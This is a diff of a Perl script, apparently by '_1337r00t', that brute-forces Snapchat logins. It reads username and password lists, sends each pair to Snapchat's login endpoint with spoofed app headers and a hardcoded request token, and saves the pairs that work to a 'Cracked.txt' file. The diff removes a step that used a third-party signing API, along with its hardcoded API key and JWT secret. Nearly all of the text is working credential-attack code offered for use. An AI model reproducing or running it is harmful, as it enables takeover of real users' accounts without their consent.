@@ -1,7 +1,7 @@
 use LWP::UserAgent;
-use JSON::WebToken;
 system('clear');
 system('cls');
+system('color 5');
 print qq(
 ################################
 # BruteForce SC using (Capser) #
@@ -14,7 +14,7 @@ print qq(
 #    Twitter : _1337r00t       #
 #                              #
 ################################
-Enter [CTRL+C] For Exit :0[w]\nw);
+Enter [CTRL+C] For Exit :0\n);
 print qq(
 Enter Usernames File :
 > );
@@ -48,42 +48,24 @@ foreach $password (@PASSS) {
 chomp $password;
 	foreach $username (@USERS) {
 	chomp $username;
-		$casper = LWP::UserAgent->new();
-		$jwt = JSON::WebToken->encode({
-		sub => 'Joe',
-		username => $username,
-		password => $password,
-		iat => time,
-		}, 'f3cdf4bbf206f5d572c6db13757c06fe');
-		$casper->default_header('X-Casper-API-Key' => "dd3779d571409a67743c7e0e18a2cc04");
-		$casper->default_header('user-agent' => "Snapchat/10.0 (iPhone7;iOS10.1.1;gzip)");
-		$req_sc = $casper->post('https://casper-api.herokuapp.com/snapchat/ios/login',{ jwt => $jwt });
 		#####################3
 		$snapchat = LWP::UserAgent->new();
-		$snapchat->default_header('Accept-Language' => $req_sc->content=~/"Accept-Language":"(.+?)"/);
-		$snapchat->default_header('Accept-Locale' => $req_sc->content=~/"Accept-Locale":"(.+?)"/);
-		$snapchat->default_header('User-Agent' => $req_sc->content=~/"User-Agent":"(.+?)"/);
-		$snapchat->default_header('X-Snapchat-Client-Auth-Token' => $req_sc->content=~/"X-Snapchat-Client-Auth-Token":"(.+?)"/);
-		$snapchat->default_header('X-Snapchat-Client-Token' => $req_sc->content=~/"X-Snapchat-Client-Token":"(.+?)"/);
-		$snapchat->default_header('X-Snapchat-UUID' => $req_sc->content=~/"X-Snapchat-UUID":"(.+?)"/);
-		$response = $snapchat->post($req_sc->content=~/"url":"(.+?)"/ ,
+		$snapchat->default_header('Accept-Language' => 'en;q=0.9');
+		$snapchat->default_header('User-Agent' => 'Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)');
+		$response = $snapchat->post('https://app.snapchat.com/loq/login',
 			{ 
 			password => $password,
-			req_token => $req_sc->content=~/"req_token":"(.+?)"/,
-			timestamp => $req_sc->content=~/"timestamp":"(.+?)"/,
+			req_token => '9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b',
+			timestamp => '1509567052943',
 			username => $username
 			}
 			);
 		$code = $response->status_line();
 		if($code=~/200/){
-			if($response->content=~/"logged":true/){
-				print "-----\nCracked -> ($username:$password)\nEmail: [ ";
-				print $response->content=~/"email":"(.+?)"/;
-				print " ]\n-----\n";
+			if($response->content=~/Thanks!/){
+				print "\n-----\nCracked -> ($username:$password)\n-----\n";
 				open(R0T,">>Cracked.txt");
-				print R0T "\n($username:$password:[Email: ";
-				print R0T $response->content=~/"email":"(.+?)"/;
-				print R0T " ])\n";
+				print R0T "\n($username:$password)";
 				close(R0T);
 				sleep(2)
 			}
@@ -94,8 +76,14 @@ chomp $password;
 				}
 				else
 				{
-					$response->content();
-					print "\n";
+					if($response->content=~/Invalid account/){
+						print "Invalid account -> ($username)\n";
+					}
+					else
+					{
+						print $response->content();
+						print "\n";
+					}
 				}
 			}
 		}
